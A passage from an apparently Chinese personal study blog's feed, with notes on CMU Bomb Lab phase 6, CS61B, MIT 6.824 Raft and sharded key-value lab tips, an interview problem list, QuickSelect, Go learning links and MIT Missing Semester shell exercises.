前一个node的值比后一个要大，即node值递减</span><br></pre></td></tr></table></figure><p>所以node的顺序应为3，4，5，6，1，2。考虑到我们之前用7对传入的数字作差，为了得到这个序列，传入的数字应该是，4，3，2，1，6，5这就是我们最终的结果。</p><p>phase 6 主要参考这些文章：<br><a href="https://earthaa.github.io/2020/01/12/CSAPP-Bomblab/">https://earthaa.github.io/2020/01/12/CSAPP-Bomblab/</a><br><a href="http://zpalexander.com/binary-bomb-lab-phase-6/">http://zpalexander.com/binary-bomb-lab-phase-6/</a></p><h3 id="bomb-lab-中一些琐碎的知识点"><a href="#bomb-lab-中一些琐碎的知识点" class="headerlink" title="bomb lab 中一些琐碎的知识点"></a>bomb lab 中一些琐碎的知识点</h3><p>汇编语言中，(register)是什么意思，（e.g. (%rsp)什么意思) ？<br><a href="https://stackoverflow.com/questions/61004313/what-do-parentheses-surrounding-a-register-mean">https://stackoverflow.com/questions/61004313/what-do-parentheses-surrounding-a-register-mean</a></p><p>数字+（register）的含义：<br>register中储存的地址+数字，得到一个新地址，这个新地址指向的内存所存储的东西。<br><a href="https://stackoverflow.com/questions/24746123/assembly-mov-instruction">https://stackoverflow.com/questions/24746123/assembly-mov-instruction</a></p><p>test %eax %eax<br><a href="https://stackoverflow.com/questions/13064809/the-point-of-test-eax-eax">https://stackoverflow.com/questions/13064809/the-point-of-test-eax-eax</a></p><p>movzbl:<br>assembly to convert the byte in %al to a doubleword in %ebx with<br>zero-extension would be movzbl %al, %ebx.<br><a href="https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf">https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf</a></p><p>movslq:<br><a href="https://stackoverflow.com/questions/55584797/what-does-movslq-do">https://stackoverflow.com/questions/55584797/what-does-movslq-do</a></p><p>GDB x command 介绍：<br><a href="https://visualgdb.com/gdbreference/commands/x">https://visualgdb.com/gdbreference/commands/x</a></p><h3 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献：###"></a>参考文献：###</h3><p><a href="https://earthaa.github.io/2020/01/12/CSAPP-Bomblab/">https://earthaa.github.io/2020/01/12/CSAPP-Bomblab/</a><br><a href="https://www.cnblogs.com/sinkinben/p/12397430.html">https://www.cnblogs.com/sinkinben/p/12397430.html</a><br><a href="http://zpalexander.com/binary-bomb-lab-phase-6/">http://zpalexander.com/binary-bomb-lab-phase-6/</a></p>]]></content>
      
      
      <categories>
          
          <category> 自学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU 15-213 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UCB CS61B Data Structures 总结</title>
      <link href="/2022/12/22/ucb-cs61b-data-structures-zong-jie/"/>
      <url>/2022/12/22/ucb-cs61b-data-structures-zong-jie/</url>
      
        <content type="html"><![CDATA[<p>这里并没有记录所有的labs and projects.只记录我觉得重要的点。</p><h3 id="project-1"><a href="#project-1" class="headerlink" title="project 1"></a>project 1</h3><ol><li>为什么Java constructor 不需要return type？<br><a href="https://stackoverflow.com/questions/6801500/why-do-constructors-in-java-not-have-a-return-type">https://stackoverflow.com/questions/6801500/why-do-constructors-in-java-not-have-a-return-type</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 自学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UCB CS61B </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>优质CS公开课</title>
      <link href="/2022/11/25/you-zhi-cs-gong-kai-ke/"/>
      <url>/2022/11/25/you-zhi-cs-gong-kai-ke/</url>
      
        <content type="html"><![CDATA[<p>优质CS公开课</p><p><a href="https://csdiy.wiki/">https://csdiy.wiki/</a></p><p><a href="https://conanhujinming.github.io/comments-for-awesome-courses/index.html">https://conanhujinming.github.io/comments-for-awesome-courses/index.html</a></p><p><a href="https://conanhujinming.github.io/post/how_to_learn_cs/">https://conanhujinming.github.io/post/how_to_learn_cs/</a></p><p><a href="https://github.com/spring2go/cs_study_plan">https://github.com/spring2go/cs_study_plan</a></p><p><a href="https://cha.fan/questions/6Yab9UujPZE7xkexE8Jc">https://cha.fan/questions/6Yab9UujPZE7xkexE8Jc</a></p><p><a href="http://yc.eethu.cn/?/article/12">http://yc.eethu.cn/?/article/12</a></p>]]></content>
      
      
      <categories>
          
          <category> 公开课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS, 公开课 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIT 6.824 Distributed System Labs 总结/踩坑</title>
      <link href="/2022/10/24/mit-6.824-distributed-system-labs-zong-jie-cai-keng/"/>
      <url>/2022/10/24/mit-6.824-distributed-system-labs-zong-jie-cai-keng/</url>
      
        <content type="html"><![CDATA[<p>Lecture看的Spring 2020的，Morris老师讲的，slides, notes，labs用的是最新的Spring 2022的.<br>由于整个战线拉的很长，且最后才写总结，前面的lab不太记得了，很多细节也记不清了，所以简单写一下所有lab的总结。</p><h1 id="Lab-1"><a href="#Lab-1" class="headerlink" title="Lab 1"></a>Lab 1</h1><p>略</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/PKUFlyingPig/MIT6.824/tree/master/src/mr">https://github.com/PKUFlyingPig/MIT6.824/tree/master/src/mr</a></p><h1 id="Lab-2-Raft"><a href="#Lab-2-Raft" class="headerlink" title="Lab 2 Raft"></a>Lab 2 Raft</h1><p>lab2 主要是按照raft论文中的图2来实现，有些细节感觉图上也没有cover,我有些是根据自己的理解实现的。lab2 webpage里的下列几个guide链接比较有用：<br><a href="https://thesquareplanet.com/blog/students-guide-to-raft/">https://thesquareplanet.com/blog/students-guide-to-raft/</a><br><a href="https://pdos.csail.mit.edu/6.824/labs/raft-locking.txt">https://pdos.csail.mit.edu/6.824/labs/raft-locking.txt</a><br><a href="https://pdos.csail.mit.edu/6.824/labs/raft-structure.txt">https://pdos.csail.mit.edu/6.824/labs/raft-structure.txt</a></p><p>lab2整体的逻辑和架构并不太复杂，就是corner case很多，要费很多精力debug.</p><p>关于sendHeartBeat(),我一开始的实现只是周期性的sendHeartBeat（按照lab要求每100ms一次）,但是测试时发现这样有点慢，无法满足lab中总的时间要求。我参阅别人的实现，将sendHeartBeat()的触发条件进行了修改。<br>触发条件1：每100ms sendHeartBeat(即原始的要求)<br>触发条件2：当Start()函数被调用并添加了新的logEntry时</p><p>详情参阅我code中的BroadcastHeartBeat().</p><p>关于我的LeaderCommiter(), 我先让LeaderCommiter() sleep 一小段时间, 因为我在sendHeartBeat()之后用goroutine执行LeaderCommiter, 我希望sendHeartBeat能先拿到锁更新rf.matchedIdx,然后再让LeaderCommiter()拿到锁，这样可以加快程序运行。<br>否则的话，LeaderCommiter()要多几次无效执行。不知道还有没有更elegent的方式。</p><h2 id="Lab-2A"><a href="#Lab-2A" class="headerlink" title="Lab 2A"></a>Lab 2A</h2><h2 id="Lab-2B"><a href="#Lab-2B" class="headerlink" title="Lab 2B"></a>Lab 2B</h2><h2 id="Lab-2C"><a href="#Lab-2C" class="headerlink" title="Lab 2C"></a>Lab 2C</h2><h2 id="Lab-2D"><a href="#Lab-2D" class="headerlink" title="Lab 2D"></a>Lab 2D</h2><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>leader给followers传送log时一定要copy自己的log到args,不能直接用slice,否则接收的server和原始的server引用的是同一个log.</p><p>ApplyLog()中，不要每次给log加锁构造applyMsg并穿递给server层，这样每次要很久才能释放锁，容易造成阻塞。较好的做法是加锁，将要apply的那部分log copy到一个applyQueue里，然后解锁。根据applyQueue里的log构造applyMsg并向server层传递。raft向server层穿递applyMsg时也不要加锁。</p><p>根据Lab instruction（还是论文？记不清了）第一个command是第1个logEntry,不是第0个logEntry.以后回收log的时候，我会将snapshot包含的最后一个logEntry保留一份放在新log 最开头的位置，这样做会比较方便，而且与“第一个command是第1个logEntry”这一要求保持一致。</p><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><h1 id="Lab-3-kvraft"><a href="#Lab-3-kvraft" class="headerlink" title="Lab 3 kvraft"></a>Lab 3 kvraft</h1><p>Lab3 在lab2的基础上加上了Key Value Server(KVServer)和client。Lab 4与lab3类似，但比lab3更难，由于lab4会有较详细的记录，所以lab3不详述。</p><h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/Ginko-L/6.824-lab/tree/master/src/kvraft">https://github.com/Ginko-L/6.824-lab/tree/master/src/kvraft</a><br><a href="https://github.com/OneSizeFitsQuorum/MIT6.824-2021/blob/master/docs/lab3.md">https://github.com/OneSizeFitsQuorum/MIT6.824-2021/blob/master/docs/lab3.md</a></p><h1 id="Lab-4-Shardkv"><a href="#Lab-4-Shardkv" class="headerlink" title="Lab 4 Shardkv"></a>Lab 4 Shardkv</h1><p>Lab4 要求实现一个sharded KV service. 有多个replica Group（简称group）, 每个group有多个server。将data分为多个shard, 每个shard包含一个或多个key. 每个shard被assign给一个group。Lab 4 大体上与Lab 3 类似, lab3是一个group, lab4扩展到了多个group。我也实现了全部challenge。</p><h2 id="Lab-4A"><a href="#Lab-4A" class="headerlink" title="Lab 4A"></a>Lab 4A</h2><h3 id="要实现的功能："><a href="#要实现的功能：" class="headerlink" title="要实现的功能：###"></a>要实现的功能：###</h3><p>shard controler(shardctrl) 负责控制shard和group的移动。shardctrl要实现四中控制功能，<br>Join(servers): 新加入一组server<br>Leave(gid): group离开(gid is group id)<br>Move(shardId, gid): 将一个shard移动到指定的group.<br>Query(cfgNum):  return the configuration that has that config number.</p><p>要求每个group的负载尽可能均衡，并且shard的移动尽可能少。</p><p>shardctrl 包含server和client，client发出RPC请求，由server负责实现。</p><h3 id="架构："><a href="#架构：" class="headerlink" title="架构：###"></a>架构：###</h3><p>client: 主要实现向server发送Join, Leave, Move, Query RPC请求。</p><p>server：<br>实现Join, Leave, Move, Query四个RPC handler。<br>每个RPC handler负责接收client传来的请求<br>RPC handler将对应的操作传递给raft层进行同步。<br>process()函数执行raft层同步后的操作，然后将操作结果传给对应的RPC handler。<br>RPC handler接收来自process()的操作结果，并将结果返回给client。</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现:"></a>实现:</h3><p>我们需要</p><ol><li>实现Join, Leave, Move, Query四个RPC handler。</li><li>实现process()函数。</li></ol><p>Move, Query比较简单，不赘述。<br>Join, Leave需要求每个group的负载尽可能均衡，并且shard的移动尽可能少。</p><p>大致思路就是<br>算出每个group需要负载的shard数目的平均值，注意平均值可能有两个：<br>    max_shards :&#x3D; int(math.Ceil(float64(NShards) &#x2F; float64(len(Cfg.Groups))))<br>    min_shards :&#x3D; int(math.Floor(float64(NShards) &#x2F; float64(len(Cfg.Groups))))<br>算出有几个group需要负载max_shards个shard：<br>    num_max :&#x3D; NShards % len(Cfg.Groups)</p><h3 id="tips："><a href="#tips：" class="headerlink" title="tips：###"></a>tips：###</h3><p>注意：Go中map iteration的顺序是不定的！</p><p><a href="https://stackoverflow.com/questions/32751537/why-do-i-get-a-cannot-assign-error-when-setting-value-to-a-struct-as-a-value-i">https://stackoverflow.com/questions/32751537/why-do-i-get-a-cannot-assign-error-when-setting-value-to-a-struct-as-a-value-i</a></p><p><a href="https://blog.csdn.net/makenothing/article/details/105037977">https://blog.csdn.net/makenothing/article/details/105037977</a></p><h2 id="Lab-4B"><a href="#Lab-4B" class="headerlink" title="Lab 4B"></a>Lab 4B</h2><h3 id="功能-amp-架构"><a href="#功能-amp-架构" class="headerlink" title="功能 &amp; 架构"></a>功能 &amp; 架构</h3><p>lab4B 就是要实现shardKV server和client。大体的架构与lab4A 和lab3类似。</p><p>server 与 client之间：<br>server需要实现Get(key), Put(key, value), Append(key, value)，并将结果返回给client.</p><p>server与controll之间：<br>server需要周期性的fetch config, 根据config来移动shard。<br>参阅我code中的FetchConfig()。</p><p>server与server之间：<br>server s 需要向server t request shard sd, server t将shard sh传输给server s。server s成功将shard sd存储之后要向server t发送RemoveShard RPC, server t 收到之后需要将自己存储的shard sd置为invalid（或删除）。<br>参阅我code中的SendRequestShards(), RequestShards(), SendRemoveShards(), RemoveShards()</p><p>server与自己的raft层：<br>server需要将Get, Put, Append, 移入shards(即UpdateShards), 移除shards(即RemoveShards), 更新config操作传递给raft层（raft打日志）以实现整个group server的同步。server 需要读取raft层传递来的applyMsg来执行相应操作。<br>参阅我code中的process().</p><h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><p>Get(), PutAppend()与lab 3类似，server需要根据client的args构造相应的operation, 将oper传到raft层，然后等待operation的执行结果，并将结果传给client。</p><p>与lab3不同的是，lab4中，group leader需要周期性从controller那里fetch config(通过FetchConfig实现). group leader 需要周期性的检查自己负责的shard是否齐全（通过ShardCheck()实现），不齐全了要向前一个负责该shard的server索要该shard（通过sendRequestShard()实现）。当收到别的server发来的shard时，group leader向raft层传递UpdateShards operation, 从而将该shard同步给group里的所有server。当group leader的process()函数执行完了UpdateShards operation后，group leader 向相应的server 发送RemoveShardsArgs （通过sendRemoveShards()实现）.</p><p>group leader还要处理别的server发来的RequestShardArgs(通过RequestShard() RPC handler实现，将对方server请求的shard发给它)。</p><p>group leader还要处理别的server发来的RemoveShardArgs(通过RemoveShard() RPC handler实现). 当收到别的server发来的RemoveShardArgs，说明对方server已经成功将该shard存储，RemoveShard() RPC handler就会向raft层传递RemoveShards operation,从而该group的所有server都会将该shard置为invalid并删除。</p><p>每个shard(在我的code里是ShardKey struct{})要包含一个status field,表示该shard的状态。<br>0：invalid,表示此server中该shard无效<br>1: valid, 表示此server中该shard有效<br>2: requiring,表示server正在向别的server请求该shard<br>3: moving，表示在此server中，该shard即将被移动到别的shard<br>详情见我的code里是ShardKey struct{}</p><h3 id="tips-1"><a href="#tips-1" class="headerlink" title="tips"></a>tips</h3><ol start="0"><li><p>checkDuplicate()需要记录clientID, client last sequence number, 以及client last operation results. 原来的labclientID, client last sequence number, 以及client last operation results都是记录在server中（是server这个struct的一个field）,这在之前的lab是可行的，但在lab 4B不行。因为如果保存在server中，shard迁移到另一个group的时候，这些信息没有迁移到新的group中，会造成某些操作的重复执行，使得结果错误。所以要将这些信息作为一个shard的field.</p></li><li><p>一定要等到server s成功存储了请求的shard sd之后（即server s 的process()执行了UpdateShards的operation之后），server t才能向raft层传递RemoveShards operation。不能server t 将shard sd发动出去之后就删除shard sd,这样的话如果server s 没能成功接收shard sd或者因为什么别的原因没能将shard sd 传递到raft层时，会造成shard sd的丢失。</p></li><li><p>process() 中 Put, Append 成功时不要将op.Value返回给client,题目中没要求返回value给client，是我自己这样做的，这样不对，因为要保存每个client最后一个操作的结果，这样会多占用存储空间，导致lab4B Challenge 1 garbage collection无法通过！</p></li><li><p>SendRequestShards(), SendRemoveShards(), client的函数中对于收到回应的不同情况(e.g. wrong leader, wrong group…)的处理比较tricky, 比较保险的做法是一个group里的所有server都要发一遍RPC。</p></li><li><p>在和raft层交互时（e.g. kv.rf.Start(), kv.rf.GetState(), kv.rf.Snapshot()…）不要加锁,否则容易死锁。</p></li><li><p>InstallSnapshot之后，由于raft层的applyQueue中尚有待apply的log,会造成server接收到的新的applyMsg的commandIndex &lt;&#x3D; 已经执行过的applyMsg的commandIndex(或者 &lt;&#x3D; InstallSnapshot的Index),即command的回滚。因此，server要记录已经执行的command（即applyMsg）的commandIndex, 如果后来的commandIndex &lt;&#x3D; 已经执行过的commandIndex，不要执行该command,继续下一条command. </p></li><li><p>lab 4B非常吃CPU，注意程序不要产生过多的Goroutine，注意尽量少产生RPC.不要有一直不停运行的for loop。当server被kill之后，相应的goroutine要停止。for loop中sleep的时间要设置的比较合适。尽量只让group leader之间进行通信，以减少RPC。</p></li><li><p>记得好像select也会增加很多goroutine（还是很吃CPU？记不太清了，总之当时debug的时候根据go profiling tools改进了client的switch）。</p></li></ol><h2 id="参考-3"><a href="#参考-3" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/Ginko-L/6.824-lab/tree/master/src/shardctrler">https://github.com/Ginko-L/6.824-lab/tree/master/src/shardctrler</a><br><a href="https://github.com/Ginko-L/6.824-lab/tree/5695c2c22f28123a49875990d27a03c463969f71/src/shardkv">https://github.com/Ginko-L/6.824-lab/tree/5695c2c22f28123a49875990d27a03c463969f71/src/shardkv</a><br><a href="https://github.com/OneSizeFitsQuorum/MIT6.824-2021/blob/master/docs/lab4.md">https://github.com/OneSizeFitsQuorum/MIT6.824-2021/blob/master/docs/lab4.md</a></p><h2 id="Debug-技巧"><a href="#Debug-技巧" class="headerlink" title="Debug 技巧"></a>Debug 技巧</h2><h3 id="Go-profiling-tools"><a href="#Go-profiling-tools" class="headerlink" title="Go profiling tools"></a>Go profiling tools</h3><p><a href="https://go.dev/doc/diagnostics">https://go.dev/doc/diagnostics</a><br><a href="https://pkg.go.dev/runtime/pprof">https://pkg.go.dev/runtime/pprof</a><br><a href="https://dev.to/agamm/how-to-profile-go-with-pprof-in-30-seconds-592a">https://dev.to/agamm/how-to-profile-go-with-pprof-in-30-seconds-592a</a></p>]]></content>
      
      
      <categories>
          
          <category> 自学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MIT 6.824，distributed system </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>YF笔试</title>
      <link href="/2022/09/24/yf-bi-shi/"/>
      <url>/2022/09/24/yf-bi-shi/</url>
      
        <content type="html"><![CDATA[<p>YF笔试</p><p>5道编程题</p><ol><li><p>找到通话时间最长的人的名字 （SQL）</p></li><li><p>一个数组，代表一个chain的结点。数组的值代表破坏这个结点的代价。求把chain变成3段所需的最小代价。</p></li><li><p>一个数组，正数代表收入，负数代表支出。为了不使buget出现负值，需要把一部分支出移到数组的末尾。求最少需要移动几次，才能使buget在任何时候都不为负。即从数组的开头开始加，和不出现负值。</p></li><li><p>树（多叉树）的每个节点标有字母a或b. 求树的最长路径，要求相邻节点的字母不能相同。给定一个字符串S和数组A。S只包含字母a和b,代表树的节点的字母。A[i]代表编号为i的节点的父节点的编号。根节点编号为0，根节点的父节点A[0]&#x3D;-1.返回上述最长路径的长度。</p></li></ol><p>注意：这个路径不一定要经过根节点。</p><ol start="5"><li>给定一个数组，数组的值代表小球上的数字。用三种颜色RGB染这些小球，使得三种颜色平衡（即三种颜色的和相等）。返回一个包含RGB的字符串，表示给小球染色的结果。</li></ol><p>与Leetcode 698相似</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法题， 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QuickSelect 算法时间复杂度</title>
      <link href="/2022/09/18/quickselect-suan-fa-shi-jian-fu-za-du/"/>
      <url>/2022/09/18/quickselect-suan-fa-shi-jian-fu-za-du/</url>
      
        <content type="html"><![CDATA[<p>QuickSelect 算法<br>class Solution:<br>    def findKthLargest(self, nums: List[int], k: int) -&gt; int:<br>        #我自己写的QuickSelect算法<br>        #print(nums)<br>        pivotVal &#x3D; nums[0]<br>        left &#x3D; []<br>        right &#x3D; []<br>        for i in range(1, len(nums)):<br>            if nums[i] &lt; pivotVal:<br>                left.append(nums[i])<br>            else:<br>                right.append(nums[i])<br>        if len(right) &#x3D;&#x3D; k-1:<br>            return pivotVal<br>        elif len(right) &lt; k-1:<br>            # nums1 &#x3D; copy.deepcopy(nums)<br>            # nums1 &#x3D; nums1[:len(left)]<br>            return self.findKthLargest(left, k-len(right)-1)<br>        else:<br>            # nums1 &#x3D; copy.deepcopy(nums)<br>            # nums1 &#x3D; nums1[len(left):]<br>            return self.findKthLargest(right, k)</p><p><a href="https://stackoverflow.com/questions/56940793/quickselect-time-complexity-explained">https://stackoverflow.com/questions/56940793/quickselect-time-complexity-explained</a></p><p><a href="https://medium.com/nerd-for-tech/quick-select-algorithm-17ac146b6218">https://medium.com/nerd-for-tech/quick-select-algorithm-17ac146b6218</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构与算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法，时间复杂度 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程，线程，协程</title>
      <link href="/2022/09/18/jin-cheng-xian-cheng-xie-cheng/"/>
      <url>/2022/09/18/jin-cheng-xian-cheng-xie-cheng/</url>
      
        <content type="html"><![CDATA[<p><a href="https://stackoverflow.com/questions/1934715/difference-between-a-coroutine-and-a-thread">https://stackoverflow.com/questions/1934715/difference-between-a-coroutine-and-a-thread</a></p><p><a href="https://subscription.packtpub.com/book/programming/9781788627160/1/ch01lvl1sec02/processes-threads-and-coroutines">https://subscription.packtpub.com/book/programming/9781788627160/1/ch01lvl1sec02/processes-threads-and-coroutines</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/06/15/mit-6.824-distributed-system/"/>
      <url>/2022/06/15/mit-6.824-distributed-system/</url>
      
        <content type="html"><![CDATA[<h2 id="MIT-6-824"><a href="#MIT-6-824" class="headerlink" title="MIT 6.824"></a>MIT 6.824</h2><p>Lab 1<br>主要参考：<a href="https://github.com/PKUFlyingPig/MIT6.824/tree/master/src/mr">https://github.com/PKUFlyingPig/MIT6.824/tree/master/src/mr</a><br>这个也挺好的 <a href="https://github.com/OneSizeFitsQuorum/MIT6.824-2021/blob/master/docs/lab1.md">https://github.com/OneSizeFitsQuorum/MIT6.824-2021/blob/master/docs/lab1.md</a></p><p>这个解析写的比较详细 <a href="https://www.guodong.plus/2020/1227-214432/#%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93">https://www.guodong.plus/2020/1227-214432/#%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93</a></p><p>这个看起来也不错，没太细看 <a href="https://siegelion.cn/2021/09/24/MIT%206.824-Lab%201/#%E7%BB%93%E6%9E%9C">https://siegelion.cn/2021/09/24/MIT%206.824-Lab%201/#%E7%BB%93%E6%9E%9C</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/06/10/go-yu-yan-slice-yu-capacity/"/>
      <url>/2022/06/10/go-yu-yan-slice-yu-capacity/</url>
      
        <content type="html"><![CDATA[<h1 id="Go-语言"><a href="#Go-语言" class="headerlink" title="Go 语言"></a>Go 语言</h1><h2 id="slice-与-capacity"><a href="#slice-与-capacity" class="headerlink" title="slice 与 capacity"></a>slice 与 capacity</h2><p>length 是 slice 拥有元素的个数，capacity 是底层数组中 slice 的第一个元素到数组末尾的长度。<br><a href="https://sanyuesha.com/2018/07/31/go-slice/">https://sanyuesha.com/2018/07/31/go-slice/</a></p><p>Go语言学习资料：<br><a href="https://learnku.com/docs/the-way-to-go">https://learnku.com/docs/the-way-to-go</a></p><h2 id="Go程-goroutine"><a href="#Go程-goroutine" class="headerlink" title="Go程 goroutine"></a>Go程 goroutine</h2><p><a href="https://www.educative.io/answers/what-is-a-goroutine">https://www.educative.io/answers/what-is-a-goroutine</a></p><p><a href="https://gobyexample-cn.github.io/goroutines">https://gobyexample-cn.github.io/goroutines</a></p><h2 id="省略号-…-用法"><a href="#省略号-…-用法" class="headerlink" title="省略号 … 用法"></a>省略号 … 用法</h2><p><a href="https://blog.csdn.net/qq_31930499/article/details/98353008">https://blog.csdn.net/qq_31930499/article/details/98353008</a></p><h2 id="Go-sort"><a href="#Go-sort" class="headerlink" title="Go sort()"></a>Go sort()</h2><p><a href="https://books.studygolang.com/The-Golang-Standard-Library-by-Example/chapter03/03.1.html">https://books.studygolang.com/The-Golang-Standard-Library-by-Example/chapter03/03.1.html</a></p><h2 id="Lock-x2F-Mutex"><a href="#Lock-x2F-Mutex" class="headerlink" title="Lock&#x2F;Mutex"></a>Lock&#x2F;Mutex</h2><p><a href="https://www.educative.io/answers/golang-lock-mutex">https://www.educative.io/answers/golang-lock-mutex</a></p><h2 id="condition-variable"><a href="#condition-variable" class="headerlink" title="condition variable"></a>condition variable</h2><p><a href="https://kaviraj.me/understanding-condition-variable-in-go/">https://kaviraj.me/understanding-condition-variable-in-go/</a><br><a href="https://ieevee.com/tech/2019/06/15/cond.html">https://ieevee.com/tech/2019/06/15/cond.html</a><br><a href="https://cyent.github.io/golang/goroutine/sync_cond/#_6">https://cyent.github.io/golang/goroutine/sync_cond/#_6</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MIT Missing semester in your CS education 2020</title>
      <link href="/2022/06/01/mit-missing-semester-in-cs/"/>
      <url>/2022/06/01/mit-missing-semester-in-cs/</url>
      
        <content type="html"><![CDATA[<h2 id="lec-1-exercise"><a href="#lec-1-exercise" class="headerlink" title="lec 1 exercise"></a>lec 1 exercise</h2><ol><li><p>echo $SHELL</p></li><li><p>mkdir .&#x2F;tmp&#x2F;missing 或 mkdir tmp&#x2F;missing</p></li><li><p>man touch</p></li><li><p>touch .&#x2F;missing&#x2F;semester 或 touch missing&#x2F;semester</p></li><li><p>略</p></li><li><p>xx@DESKTOP-xxxxxxx:~&#x2F;MITMissingSem&#x2F;tmp&#x2F;missing$ .&#x2F;semester<br>bash: .&#x2F;semester: Permission denied</p></li></ol><p>xx@DESKTOP-xxxxxxx:~&#x2F;MITMissingSem&#x2F;tmp&#x2F;missing$ ls -lah<br>total 12K<br>drwxr-xr-x 2 nl nl 4.0K Jun  3 11:45 .<br>drwxr-xr-x 3 nl nl 4.0K Jun  3 09:40 ..<br>-rw-r–r– 1 nl nl   60 Jun  3 11:46 semester</p><p>发现没有对semester的执行权限</p><ol start="7"><li><p>因为我们对semester有读权限，对sh有执行权限，所以用sh semester时，sh读进 semester再执行，是可以成功的。</p></li><li><p>man chmod</p></li><li><p>chmod +x semester</p></li></ol><p>因为#!&#x2F;bin&#x2F;sh 指明了interpreter。</p><ol start="10"><li><p>.&#x2F;semester | grep modified &gt; last-modified.txt</p></li><li><p>略</p></li></ol><h2 id="lec-2-exercise"><a href="#lec-2-exercise" class="headerlink" title="lec 2 exercise"></a>lec 2 exercise</h2><ol><li><p>ls -laht –color</p></li><li><p>marco.sh如下：<br>#!bin&#x2F;bash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">marco()&#123;</span><br><span class="line">    # current_path=$pwd  注意：这样写是错的。这样的话相当于pwd是个变量，而且这个变量没有被赋值。也不能写 #current_path=pwd，因为这样的话pwd会被当作字符串，current_path的值就是pwd.</span><br><span class="line">    # saved_dir=$current_path</span><br><span class="line">    # echo &quot;pwd: $current_path saved&quot;</span><br><span class="line">    saved_dir=&quot;$(pwd)&quot;</span><br><span class="line">    echo &quot;pwd: $(pwd) saved&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">polo()&#123;</span><br><span class="line">    cd &quot;$saved_dir&quot;</span><br><span class="line">    echo &quot;change dir to $saved_dir&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>执行 souce path&#x2F;to&#x2F;marco.sh</p><p>然后随便执行什么命令或者不执行任何命令</p><p>执行marco，记录当前路径</p><p>然后随便执行什么命令或者不执行任何命令</p><p>执行polo， 切换到记录的路径</p><ol start="3"><li><p>参考<a href="https://hackmd.io/@apad0JTaSjqEjZE4TuX2vQ/r1AhU6bJO#Lecture-2-Shell-Tools">https://hackmd.io/@apad0JTaSjqEjZE4TuX2vQ/r1AhU6bJO#Lecture-2-Shell-Tools</a><br><a href="https://missing-semester-cn.github.io/missing-notes-and-solutions//2020/solutions/shell-tools-solution/">https://missing-semester-cn.github.io/missing-notes-and-solutions//2020/solutions/shell-tools-solution/</a><br>好像都不太对。暂时还没解决。</p></li><li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name &#x27;*.html&#x27; | xargs -d &#x27;\n&#x27; tar -czf ./target.tar.gz</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -name &quot;*.html&quot; | xargs -d &#x27;\n&#x27;  tar -cvzf html.zip</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -type f -printf &#x27;%T@ %p\n&#x27; | sort -n | cut -f2 -d&quot; &quot;</span><br></pre></td></tr></table></figure><p>来源：<a href="https://hackmd.io/@apad0JTaSjqEjZE4TuX2vQ/r1AhU6bJO#Lecture-2-Shell-Tools">https://hackmd.io/@apad0JTaSjqEjZE4TuX2vQ/r1AhU6bJO#Lecture-2-Shell-Tools</a><br><a href="https://stackoverflow.com/questions/4561895/how-to-recursively-find-the-latest-modified-file-in-a-directory">https://stackoverflow.com/questions/4561895/how-to-recursively-find-the-latest-modified-file-in-a-directory</a></p></li></ol><p>find . -type f -print0 | xargs -0 ls -lt | head -1<br><a href="https://missing-semester-cn.github.io/missing-notes-and-solutions//2020/solutions/shell-tools-solution/">https://missing-semester-cn.github.io/missing-notes-and-solutions//2020/solutions/shell-tools-solution/</a></p><h2 id="lec-4-exercise"><a href="#lec-4-exercise" class="headerlink" title="lec 4 exercise"></a>lec 4 exercise</h2><p>2. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep ^.*a.*a.*a.*[^\(\&#x27;s\)]$ /usr/share/dict/words |tr [:upper:] [:lower:] | sed -E &#x27;s/^.*([a-z]&#123;2&#125;)/\1/&#x27; | sort | 